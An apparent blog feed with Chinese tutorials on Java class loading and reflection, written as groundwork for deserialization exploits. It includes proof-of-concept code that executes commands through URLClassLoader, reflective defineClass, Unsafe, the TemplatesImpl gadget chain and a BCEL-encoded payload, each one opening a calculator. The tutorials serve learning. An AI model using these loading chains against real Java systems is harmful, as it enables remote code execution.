<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://www.yyxyy.xyz/</id>
    <title>Yyx</title>
    <updated>2023-03-19T08:43:30.791Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://www.yyxyy.xyz/"/>
    <link rel="self" href="https://www.yyxyy.xyz/atom.xml"/>
    <subtitle>&lt;marquee&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://api.xygeng.cn/one/get/&quot;&gt;&lt;/script&gt;&lt;/marquee&gt;</subtitle>
    <logo>https://www.yyxyy.xyz/images/avatar.png</logo>
    <icon>https://www.yyxyy.xyz/favicon.ico</icon>
    <rights>All rights reserved 2023, Yyx</rights>
    <entry>
        <title type="html"><![CDATA[类的动态加载]]></title>
        <id>https://www.yyxyy.xyz/post/lei-de-dong-tai-jia-zai/</id>
        <link href="https://www.yyxyy.xyz/post/lei-de-dong-tai-jia-zai/">
        </link>
        <updated>2023-06-20T11:42:08.000Z</updated>
        <content type="html"><![CDATA[<h1 id="类加载器及双亲委派">类加载器及双亲委派</h1>
<h2 id="类加载器">类加载器</h2>
<h3 id="作用">作用</h3>
<p>加载Class文件</p>
<p>ClassLoader 的工作如图所示 （偷个图)</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/2.png" alt="img" loading="lazy"></figure>
<h3 id="启动类加载器bootstrap-classloader"><strong>启动类加载器(Bootstrap ClassLoader):</strong></h3>
<p>这个类加载器负责将\lib目录下的类库加载到虚拟机内存中,用来加载java的核心库,此类加载器并不继承于java.lang.ClassLoader,不能被java程序直接调用,代码是使用C++编写的.是虚拟机自身的一部分.</p>
<h3 id="扩展类加载器extendsion-classloader"><strong>扩展类加载器(Extendsion ClassLoader):</strong></h3>
<p>这个类加载器负责加载\lib\ext目录下的类库,用来加载java的扩展库,开发者可以直接使用这个类加载器.</p>
<h3 id="应用程序类加载器application-classloader"><strong>应用程序类加载器(Application ClassLoader):</strong></h3>
<p>这个类加载器负责加载用户类路径(CLASSPATH)下的类库,一般我们编写的java类都是由这个类加载器加载,这个类加载器是CLassLoader中的getSystemClassLoader()方法的返回值,所以也称为系统类加载器.一般情况下这就是系统默认的类加载器.</p>
<p>除此之外,我们还可以加入自己定义的类加载器,以满足特殊的需求,需要继承java.lang.ClassLoader类.</p>
<p>类加载器之间的层次关系如下图:</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/3.png" alt="img" loading="lazy"></figure>
<h3 id="类加载器的核心方法">类加载器的核心方法</h3>
<ol>
<li>loadClass（加载指定的Java类）</li>
<li>findClass（查找指定的Java类）</li>
<li>findLoadedClass（查找JVM已经加载过的类）</li>
<li>defineClass（定义一个Java类）</li>
<li>resolveClass（链接指定的Java类）</li>
</ol>
<h2 id="双亲委派机制">双亲委派机制</h2>
<h3 id="双亲委派模型过程">双亲委派模型过程</h3>
<p>双亲委派模型的工作过程为：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的加载器都是如此，因此所有的类加载请求都会传给顶层的启动类加载器，只有当父加载器反馈自己无法完成该加载请求（该加载器的搜索范围中没有找到对应的类）时，子加载器才会尝试自己去加载。</p>
<p>使用双亲委派模型的好处在于<strong>Java类随着它的类加载器一起具备了一种带有优先级的层次关系</strong>。例如类java.lang.Object，它存在在rt.jar中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的Bootstrap ClassLoader进行加载，因此Object类在程序的各种类加载器环境中都是同一个类。相反，如果没有双亲委派模型而是由各个类加载器自行加载的话，如果用户编写了一个java.lang.Object的同名类并放在ClassPath中，那系统中将会出现多个不同的Object类，程序将混乱。因此，如果开发者尝试编写一个与rt.jar类库中重名的Java类，可以正常编译，但是永远无法被加载运行。</p>
<h3 id="双亲委派模型的系统实现">双亲委派模型的系统实现</h3>
<p>在java.lang.ClassLoader的loadClass()方法中，先检查是否已经被加载过，若没有加载则调用父类加载器的loadClass()方法，若父加载器为空则默认使用启动类加载器作为父加载器。如果父加载失败，则抛出ClassNotFoundException异常后，再调用自己的findClass()方法进行加载。</p>
<pre><code class="language-java">protected synchronized Class&lt;?&gt; loadClass(String name,boolean resolve)throws ClassNotFoundException{
    //check the class has been loaded or not
    Class c = findLoadedClass(name);
    if(c == null){
        try{
            if(parent != null){
                c = parent.loadClass(name,false);
            }else{
                c = findBootstrapClassOrNull(name);
            }
        }catch(ClassNotFoundException e){
            //if throws the exception ,the father can not complete the load
        }
        if(c == null){
            c = findClass(name);
        }
    }
    
    if(resolve){
        resolveClass(c);
    }
    return c;
}
</code></pre>
<p>注意，双亲委派模型是Java设计者推荐给开发者的类加载器的实现方式，并不是强制规定的。大多数的类加载器都遵循这个模型，但是JDK中也有较大规模破坏双亲模型的情况，例如线程上下文类加载器（Thread Context ClassLoader）的出现，具体分析可以参见周志明著《深入理解Java虚拟机》。</p>
<h1 id="各场景下代码块加载顺序">各场景下代码块加载顺序</h1>
<h2 id="代码块">代码块</h2>
<ul>
<li>
<ul>
<li>静态代码块：static{}</li>
<li>构造代码块：{}</li>
<li>无参构造器：ClassName()</li>
<li>有参构造器：ClassName(String name)</li>
</ul>
</li>
</ul>
<h2 id="各种场景">各种场景</h2>
<p>参考：<a href="https://drun1baby.github.io/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/#toc-heading-11">https://drun1baby.github.io/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/#toc-heading-11</a></p>
<h2 id="动态加载字节码">动态加载字节码</h2>
<h3 id="字节码的概念">字节码的概念</h3>
<p>Java 字节码（ByteCode）其实仅仅指的是 Java 虚拟机执行使用的一类指令，通常被存储在 .class 文件中。</p>
<p>如图:</p>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/4.png" alt="img" loading="lazy"></figure>
<h3 id="类加载器的原理">类加载器的原理</h3>
<p>流程:</p>
<p>ClassLoader —-&gt; SecureClassLoader —&gt; URLClassLoader —-&gt; APPClassLoader —-&gt; loadClass() —-&gt; findClass()</p>
<h3 id="利用-urlclassloader-加载远程-class-文件">利用 URLClassLoader 加载远程 class 文件</h3>
<p>正常情况下，Java会根据配置项 sun.boot.class.path 和 java.class.path 中列举到的基础路径（这些路径是经过处理后的 java.net.URL 类）来寻找.class文件来加载，而这个基础路径有分为三种情况：</p>
<p>①：URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件</p>
<p>②：URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</p>
<p>③：URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类。</p>
<h4 id="file协议">file协议</h4>
<p>javac Calc.java。将class文件移动到桌面。</p>
<pre><code class="language-plain">package org.example;
import java.io.IOException;

// URLClassLoader 的 file 协议
public class Calc {
    static {
        try {
            Runtime.getRuntime().exec(&quot;deepin-calculator&quot;);
        } catch (IOException e){
            e.printStackTrace();
        }
    }
}
</code></pre>
<p>编写UrlClassLoader。</p>
<pre><code class="language-plain">package org.example;

import java.net.URL;
import java.net.URLClassLoader;

// URLClassLoader 的 file 协议
public class FileRce {
    public static void main(String[] args) throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader
                (new URL[]{new URL(&quot;file:////home//admin//Desktop//&quot;)});
        Class calc = urlClassLoader.loadClass(&quot;org.example.Calc&quot;);
        calc.newInstance();
    }
}
</code></pre>
<p>弹出计算器</p>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/5.png" alt="img" loading="lazy"></figure>
<h4 id="http-协议">HTTP 协议</h4>
<p>在class文件下面用python -m http.server 9999起一个服务。</p>
<pre><code class="language-plain">package org.example;

import java.net.URL;
import java.net.URLClassLoader;

// URLClassLoader 的 file 协议
public class FileRce {
    public static void main(String[] args) throws Exception {
        URL url = new URL(&quot;http://127.0.0.1:9999/&quot;);
        URLClassLoader loader = new URLClassLoader(new URL[]{url});
        Class clazz = loader.loadClass(&quot;org.example.Calc&quot;);
        clazz.newInstance();
    }
}
</code></pre>
<p>弹出计算器</p>
<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/6.png" alt="img" loading="lazy"></figure>
<h4 id="filejar-协议">file+jar 协议</h4>
<p>jar -cvf Calc.jar Clac.class  打包jar包</p>
<pre><code class="language-plain">package org.example;

import java.net.URL;
import java.net.URLClassLoader;

// URLClassLoader 的 file 协议
public class FileRce {
    public static void main(String[] args) throws Exception {
        URL url = new URL(&quot;jar:file:////home//admin//Desktop//Calc.jar!/&quot;);
        URLClassLoader loader = new URLClassLoader(new URL[]{url});
        Class clazz = loader.loadClass(&quot;org.example.Calc&quot;);
        clazz.newInstance();
    }
}
</code></pre>
<p>弹出计算器</p>
<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/7.png" alt="img" loading="lazy"></figure>
<h4 id="http-jar-协议">HTTP + jar 协议</h4>
<p>python 起一个服务</p>
<pre><code class="language-plain">package org.example;

import java.net.URL;
import java.net.URLClassLoader;

// URLClassLoader 的 file 协议
public class FileRce {
    public static void main(String[] args) throws Exception {
        URL url = new URL(&quot;jar:http://127.0.0.1:9999/Calc.jar!/&quot;);
        URLClassLoader loader = new URLClassLoader(new URL[]{url});
        Class clazz = loader.loadClass(&quot;org.example.Calc&quot;);
        clazz.newInstance();
    }
}
</code></pre>
<p>弹出计算器</p>
<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/8.png" alt="img" loading="lazy"></figure>
<h3 id="利用-classloaderdefineclass-直接加载字节码">利用 ClassLoader#defineClass 直接加载字节码</h3>
<p>不管是加载远程 class 文件，还是本地的 class 或 jar 文件，Java 都经历的是下面这三个方法调用。</p>
<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/9.png" alt="img" loading="lazy"></figure>
<ul>
<li>loadClass() 的作用是从已加载的类、父加载器位置寻找类（即双亲委派机制），在前面没有找到的情况下，调用当前ClassLoader的findClass()方法；</li>
<li>findClass() 根据URL指定的方式来加载类的字节码，其中会调用defineClass()；</li>
<li>defineClass 的作用是处理前面传入的字节码，将其处理成对应的 Class 对象</li>
</ul>
<p>所以可见，真正核心的部分其实是 defineClass ，他决定了如何将一段字节流转变成一个Java类，Java默认的 ClassLoader#defineClass 是一个 native 方法，逻辑在 JVM 的C语言代码中。</p>
<p>defineClass方法调用如下。</p>
<p>name为类名，b为字节码数组，off为偏移量，len为字节码数组的长度。</p>
<pre><code class="language-java">protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len);
</code></pre>
<p>因为系统的 ClassLoader#defineClass 是一个保护属性，所以我们无法直接在外部访问。因此可以反射调用 defineClass() 方法进行字节码的加载，然后实例化之后即可弹 shell</p>
<p>首先需要获取 ClassLoader, 以下是常用几种获取 ClassLoader 的方式</p>
<pre><code class="language-java">ClassLoader loader = Thread.currentThread().getContextClassLoader();
ClassLoader loader = ClassLoader.getSystemClassLoader();
ClassLoader loader = this.getClass().getClassLoader();
</code></pre>
<p>payload</p>
<pre><code class="language-plain">package org.example;

import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;

// 利用 ClassLoader#defineClass 直接加载字节码
public class define {
    public static void main(String[] args) throws Exception{
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
        Method method = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);
        method.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get(&quot;/home/admin/Desktop/Calc.class&quot;)); // 字节码的数组
        //System.out.println(code);
        Class c = (Class) method.invoke(classLoader, &quot;org.example.Calc&quot;, code, 0, code.length);
        c.newInstance();
    }
}
</code></pre>
<figure data-type="image" tabindex="9"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/10.png" alt="img" loading="lazy"></figure>
<h3 id="unsafe-加载字节码">Unsafe 加载字节码</h3>
<ul>
<li>Unsafe中也存在defineClass()方法，本质上也是 defineClass 加载字节码的方式。</li>
</ul>
<p>虽然是public方法但是还是无法直接调用，需要反射调用</p>
<pre><code class="language-plain">package org.example;

import sun.misc.Unsafe;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.ProtectionDomain;

public class UnsafeClassLoaderRce {
    public static void main(String[] args) throws Exception{
        ClassLoader classLoader = ClassLoader.getSystemClassLoader();
        Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;
        Field unsafeField = unsafeClass.getDeclaredField(&quot;theUnsafe&quot;);
        unsafeField.setAccessible(true);
        Unsafe classUnsafe = (Unsafe) unsafeField.get(null);
        Method defineClassMethod = unsafeClass.getMethod(&quot;defineClass&quot;, String.class, byte[].class,
                int.class, int.class, ClassLoader.class, ProtectionDomain.class);
        byte[] code = Files.readAllBytes(Paths.get(&quot;/home/admin/Desktop/Calc.class&quot;));
        Class calc = (Class) defineClassMethod.invoke(classUnsafe, &quot;Calc&quot;, code, 0, code.length, classLoader, null);
        calc.newInstance();
    }
}
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/11.png" alt="img" loading="lazy"></figure>
<h3 id="templatesimpl-加载字节码">TemplatesImpl 加载字节码</h3>
<p>因为 defineClass 的作用域往往都是不开放的, 攻击者一般很难利用到它, 所以接下来我们引入 TemplatesImpl 这条非常重要的利用链, 它是各大反序列化链 (cc, rome, fastjson) 利用的基础</p>
<p>TemplatesImpl 的全类名是 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl, 其内部实现了一个TransletClassLoader</p>
<p>TransletClassLoader这个类继承了classloader，并且重写了defineClass。</p>
<figure data-type="image" tabindex="11"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/12.png" alt="img" loading="lazy"></figure>
<pre><code class="language-plain">Class defineClass(final byte[] b) {
    return defineClass(null, b, 0, b.length);
}
</code></pre>
<p>可以看到 TransletClassLoader 的 defineClass 方法没有访问修饰符, 这样的话它的作用域就为包作用域, 即可以在同一个包内被调用</p>
<p>据此在 TemplatesImpl 内部寻找调用 defineClass 的方法</p>
<figure data-type="image" tabindex="12"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/13.png" alt="img" loading="lazy"></figure>
<p>往上走TemplatesImpl的defineTransletClasses方法</p>
<figure data-type="image" tabindex="13"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/14.png" alt="img" loading="lazy"></figure>
<p>再往上TemplatesImpl的getTransletInstance方法</p>
<p>这里getTransletClasses 和 getTransletIndex 虽然都调用了 defineTransletClasses , 但是它们在调用之后并没有进行任何操作, 那么最终被加载的类就无法初始化/实例化, 不符合要求</p>
<figure data-type="image" tabindex="14"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/15.png" alt="img" loading="lazy"></figure>
<p>再往上TemplatesImpl的newTransformer方法，此时已经是public方法了外面可以直接调用，不需要再继续网上跟了</p>
<figure data-type="image" tabindex="15"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/16.png" alt="img" loading="lazy"></figure>
<p>因此我们得到了一条完整的利用链</p>
<pre><code class="language-plain">TemplatesImpl#getOutputProperties() -&gt;
TemplatesImpl#newTransformer() -&gt; 
TemplatesImpl#getTransletInstance() -&gt; 
TemplatesImpl#defineTransletClasses() -&gt; 
TransletClassLoader#defineClass()
</code></pre>
<p>尝试用 TemplatesImpl#newTransformer() 构造一个简单的 POC</p>
<pre><code class="language-plain">package org.example;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

// TemplatesImpl 的字节码构造
public class TemplatesBytes extends AbstractTranslet {
    public void transform(DOM dom, SerializationHandler[] handlers) throws TransletException{}
    public void transform(DOM dom, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException{}
    public TemplatesBytes() throws IOException{
        super();
        Runtime.getRuntime().exec(&quot;deepin-calculator&quot;);
    }
}
</code></pre>
<p>这里的字节码必须继承AbstractTranslet，因为继承了这一抽象类，所以必须要重写一下里面的方法。</p>
<p>POC</p>
<pre><code class="language-plain">package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

// 主程序
public class TemplatesRce {
    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get(&quot;/home/admin/Desktop/TemplatesBytes.class&quot;));
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, &quot;_name&quot;, &quot;Calc&quot;);
        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {code});
        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
        templates.newTransformer();
    }
//其中setFieldValue是利用反射给私有变量赋值如下
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
</code></pre>
<p>定义了一个设置私有属性的方法，命名为 setFieldValue，根据我们的链子，一个个看</p>
<pre><code class="language-plain">TemplatesImpl#getOutputProperties() -&gt;
TemplatesImpl#newTransformer() -&gt;
TemplatesImpl#getTransletInstance() -&gt;
TemplatesImpl#defineTransletClasses() -&gt;
TransletClassLoader#defineClass()
</code></pre>
<p>主要三个私有类属性</p>
<pre><code class="language-plain">setFieldValue(templates, &quot;_name&quot;, &quot;Calc&quot;); 
</code></pre>
<figure data-type="image" tabindex="16"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/17.png" alt="img" loading="lazy"></figure>
<p>这里的_name不能为null。继续跟进defineTransletClasses</p>
<figure data-type="image" tabindex="17"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/18.png" alt="img" loading="lazy"></figure>
<p>这里_bytecodes不能为null。</p>
<p>_tfactory 需要是一个 TransformerFactoryImpl 对象，因为 TemplatesImpl#defineTransletClasses() 方法里有调用到 _tfactory.getExternalExtensionsMap() ，如果是 null 会出错。</p>
<p>弹计算器成功</p>
<figure data-type="image" tabindex="18"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/19.png" alt="img" loading="lazy"></figure>
<h3 id="利用-bcel-classloader-加载字节码">利用 BCEL ClassLoader 加载字节码</h3>
<p>概念:</p>
<p>BCEL 的全名应该是 Apache Commons BCEL，属于Apache Commons项目下的一个子项目，但其因为被 Apache Xalan 所使用，而 Apache Xalan 又是 Java 内部对于 JAXP 的实现，所以 BCEL 也被包含在了 JDK 的原生库中。</p>
<p>我们可以通过 BCEL 提供的两个类 Repository 和 Utility 来利用： Repository 用于将一个Java Class 先转换成原生字节码，当然这里也可以直接使用javac命令来编译 java 文件生成字节码； Utility 用于将原生的字节码转换成BCEL格式的字节码：</p>
<p>生成对应BCEL格式的字节码</p>
<pre><code class="language-plain">package org.example;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;

public class BcelDemo {
    public static void main(String[] args) throws Exception{
        Class calc = Class.forName(&quot;org.example.Calc&quot;);
        JavaClass cls = Repository.lookupClass(calc);
        String code = Utility.encode(cls.getBytes(), true);
        System.out.println(code);
    }
}
</code></pre>
<figure data-type="image" tabindex="19"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/20.png" alt="img" loading="lazy"></figure>
<p>通过 com.sun.org.apache.bcel.internal.util.ClassLoader 加载 class</p>
<pre><code class="language-plain">package org.example;

import com.sun.org.apache.bcel.internal.util.ClassLoader;

public class BcelRce {
    public static void main(String[] args) throws Exception {
        String exp=&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMO$db$40$Q$7d$9b8$b1c$9c$G$C$e1$bb$e5$ab$85$80$E$bep$DqA$m$nLA$N$82$f3fY$85$F$c7$b6$9cM$95$7f$d43$XZq$e8$P$e8$8fB$cc$$$81$a2$WK$de$99y3$ef$cd$cc$ee$9f$c7$87$df$A$b6$b1$ea$c3$c3$94$8fi$ccx$985v$ce$c5$bc$8f$S$3e$ba$f8$e4b$81$a1$bc$ab$S$a5$f7$Y$8a$cd$f5$L$Gg$3f$bd$92$M$b5H$r$f2k$bf$db$96$f99o$c7$84$d4$a3T$f0$f8$82$e7$ca$c4C$d0$d1$d7$aagsy$t$94$D$de$cdb$Z$ee$f3X$ec0x$bb$o$kJ3$wmD7$fc$3b$PU$g$k$9d$k$M$84$cc$b4J$T$w$ab$b64$X$b7$t$3c$b3$924$j$83$dfJ$fb$b9$90$87$ca$b4$a8$Y$b9$z$c3$NP$81$efb1$c0$S$96$Z$c6$ae$a4$ccT$b2IS$89$7e$ccu$9a$HX$c1g$86$f1w$g$F$f8$C$9fa$f4$df9$J$b2$d51O$3a$e1i$fbF$KM$ca$7f$a1o$fdD$ab$$$8d$e1w$a4$7e$N$g$cd$f5$e8$bf$g$da$c5$91$DI$92k$cd7$d9$96$ceU$d2$d9yK8$cbS$n$7b$3d$o$d42Jj$7b$D$e79$X$926s$e9$c5$ccW$A3$fb$d29BQH$96$91$zm$fc$E$bb$b3$e9$80$ce$f23$88$w$9d$c1$d0$ff$80$gY$P$a3$afdn$c5$80$fa$_$U$ea$c5$7b8$97$3f$e0$jo$dc$a3$7cg$f1$KqK$uZ$c5I$f2$M$bbBLs$e1UR$Z$p$ef$a5C$V$O$c5u$8a$c6$e9wQ$88$5cL8$94h$d8$a1$s$9f$Asme$a1$7b$C$A$A&quot;;
        ClassLoader loader = new ClassLoader();
        Class clazz = loader.loadClass(exp);
        clazz.newInstance();
    }
}
</code></pre>
<figure data-type="image" tabindex="20"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/JAVA/21.png" alt="img" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[动态代理]]></title>
        <id>https://www.yyxyy.xyz/post/dong-tai-dai-li/</id>
        <link href="https://www.yyxyy.xyz/post/dong-tai-dai-li/">
        </link>
        <updated>2022-04-26T12:18:34.000Z</updated>
        <content type="html"><![CDATA[<p>参考：<br>
https://www.liaoxuefeng.com/wiki/1252599548343744/1264804593397984</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[反射学习]]></title>
        <id>https://www.yyxyy.xyz/post/fan-she-xue-xi/</id>
        <link href="https://www.yyxyy.xyz/post/fan-she-xue-xi/">
        </link>
        <updated>2022-03-23T02:16:00.000Z</updated>
        <content type="html"><![CDATA[<h1 id="反射概念">反射概念</h1>
<p>Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。</p>
<p>简单讲让其具有动态特性。</p>
<p>动态特性即⼀段代码，改变其中的变量，将会导致 这段代码产⽣功能性的变化，我称之为动态特性。</p>
<h1 id="java-常用的方法">JAVA 常用的方法</h1>
<p>获取类的⽅法： forName</p>
<p>实例化类对象的⽅法： newInstance</p>
<p>获取函数的⽅法： getMethod</p>
<p>执⾏函数的⽅法： invoke</p>
<pre><code class="language-java">public void execute(String className, String methodName) throws Exception {
    Class clazz = Class.forName(className); 
    clazz.getMethod(methodName).invoke(clazz.newInstance()); 
}
</code></pre>
<h1 id="java-反射组成相关的类">Java 反射组成相关的类</h1>
<p>反射机制相关操作一般位于java.lang.reflect包中。</p>
<p>而java反射机制组成需要重点注意以下的类：</p>
<p>java.lang.Class：类对象;</p>
<p>java.lang.reflect.Constructor：类的构造器对象;</p>
<p>java.lang.reflect.Field：类的属性对象;</p>
<p>java.lang.reflect.Method：类的方法对象;</p>
<h1 id="反射的简单使用">反射的简单使用</h1>
<h2 id="1实例化对象">1.实例化对象</h2>
<p>JVM为每个加载的class创建了对应的Class实例，并在实例中保存了该class的所有信息；因此，如果获取了某个Class实例，我们就可以通过这个Class实例获取到该实例对应的class的所有信息</p>
<h3 id="0x01-直接通过一个class的静态变量class获取">0x01 直接通过一个class的静态变量class获取：</h3>
<pre><code class="language-java">Class c = String.class;
</code></pre>
<h3 id="0x02-通过该实例变量提供的getclass方法获取">0x02 通过该实例变量提供的getClass()方法获取:</h3>
<pre><code class="language-java">String s = &quot;test&quot;;
Class c = s.getClass();
</code></pre>
<h3 id="0x03-知道一个class的完整类名可以通过静态方法classforname获取">0x03 知道一个class的完整类名，可以通过静态方法Class.forName()获取</h3>
<pre><code class="language-java">Class c = Class.forName(&quot;java.lang.String&quot;);
</code></pre>
<p>由于Class实例在JVM中是唯一的，所以，上述方法获取的Class实例是同一个实例.</p>
<h2 id="2获取成员变量-field">2.获取成员变量 Field</h2>
<p>获取成员变量Field位于 java.lang.reflect.Field 包中</p>
<p>Field[] getFields() ：获取所有 public 修饰的成员变量，包括父类中的变量。</p>
<p>Field[] getDeclaredFields() 获取所有的成员变量，即包括public、private和proteced，但是不包括父类的申明变量。</p>
<p>Field getField(String name) 获取指定名称的 public 修饰的成员变量</p>
<p>Field getDeclaredField(String name) 获取指定的成员变量</p>
<pre><code class="language-java">package ysoserial.mytest;

import java.lang.reflect.Field;

public class test {
    public static void main(String[] args) throws Exception {
        Class stiClass = StuInfo.class;
        // 获取public字段&quot;age&quot;:
        System.out.println(stiClass.getField(&quot;age&quot;));
        // 获取继承的public字段&quot;name&quot;:
        System.out.println(stiClass.getField(&quot;name&quot;));
        // 获取private字段&quot;money&quot;:
        System.out.println(stiClass.getDeclaredField(&quot;money&quot;));
        // 获得值,name.get里面参数需要该类对象，而不是.class
        Field name = stiClass.getField(&quot;name&quot;);
        System.out.println(name.get(stiClass.newInstance()));
        // 设置值
        StuInfo stuInfo = new StuInfo();
        Field money = stiClass.getDeclaredField(&quot;money&quot;);
        money.setAccessible(true);
        money.set(stuInfo,2);
        System.out.println(stuInfo);




    }
}

class StuInfo extends PersonInfo{
    public int age;
    private int money;

    @Override
    public String toString() {
        return &quot;StuInfo{&quot; +
            &quot;name=&quot; + name +
            &quot;, money=&quot; + money +
            '}';
    }
}

class PersonInfo{
    public String name = &quot;test&quot;;
}
</code></pre>
<h2 id="3-获取成员方法-method">3. 获取成员方法 Method</h2>
<p>Class类提供了以下几个方法来获取Method：</p>
<ul>
<li>Method getMethod(name, Class...)：获取某个public的Method（包括父类）</li>
<li>Method getDeclaredMethod(name, Class...)：获取当前类的某个Method（不包括父类）</li>
<li>Method[] getMethods()：获取所有public的Method（包括父类）</li>
<li>Method[] getDeclaredMethods()：获取当前类的所有Method（不包括父类）</li>
</ul>
<h3 id="通过反射来使用substring">通过反射来使用substring</h3>
<pre><code class="language-java">String name = &quot;test123&quot;;
Method substring = String.class.getMethod(&quot;substring&quot;, int.class);
System.out.println(substring.invoke(name,3));
</code></pre>
<h3 id="调用的方法是静态方法-那么invoke方法传入的第一个参数永远为null">调用的方法是静态方法。那么invoke方法传入的第一个参数永远为null</h3>
<pre><code class="language-java">// 获取Integer.parseInt(String)方法，参数为String:
Method m = Integer.class.getMethod(&quot;parseInt&quot;, String.class);
// 调用该静态方法并获取结果:
Integer n = (Integer) m.invoke(null, &quot;23333&quot;);
System.out.println(n);
</code></pre>
<h2 id="4获取构造函数-constructor">4.获取构造函数 Constructor</h2>
<p>通过Class实例获取Constructor的方法如下：</p>
<pre><code class="language-java">getConstructor(Class...)：获取某个public的Constructor；
getDeclaredConstructor(Class...)：获取某个Constructor；
getConstructors()：获取所有public的Constructor；
getDeclaredConstructors()：获取所有Constructor。
</code></pre>
<p>调用非public的Constructor时，必须首先通过setAccessible(true)设置允许访问。setAccessible(true)可能会失败。</p>
<h1 id="反射的进阶使用">反射的进阶使用</h1>
<h2 id="反射创建对象">反射创建对象</h2>
<pre><code class="language-java">Class c = Class.forName(&quot;类的名称&quot;); // 创建Class对象 
Object m1 =  c.newInstance(); // 创建类对象
</code></pre>
<h2 id="反射修改被final关键字修饰的成员变量">反射修改被final关键字修饰的成员变量</h2>
<pre><code class="language-java">// 反射获取Field类的modifiers
Field modifiers = field.getClass().getDeclaredField(&quot;modifiers&quot;);
// 设置modifiers修改权限
modifiers.setAccessible(true);
// 修改成员变量的Field对象的modifiers值
modifiers.setInt(field, field.getModifiers() &amp;~Modifier.FINAL);
// 修改成员变量值
field.set(类实例对象, 修改后的值);
</code></pre>
<h2 id="利用反射弹计算器">利用反射弹计算器</h2>
